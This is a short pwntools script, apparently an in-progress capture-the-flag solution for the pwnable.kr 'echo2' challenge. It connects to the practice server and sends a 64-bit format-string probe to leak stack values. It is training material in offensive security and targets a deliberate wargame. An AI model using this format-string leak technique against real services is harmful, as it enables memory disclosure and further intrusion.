from pwn import *

r = remote("pwnable.kr", 9011)

"""
Exploit echo2 succeed in local.
Apply it remote environment!!
First I need to test FSB-64bit using "%1$lx"
"""


def select_menu(num):
    print(r.recvuntil(b"> "))
    r.sendline(num.encode())


fsb = ("%{}$lx.%{}$lx.%{}$lx.%{}$lx.%{}$lx.".format(2, 5, 10, 11, 12)).encode()


r.sendline(b"AAAA")

select_menu("2")
print(r.recvline())
r.sendline(fsb)
print(r.recv())
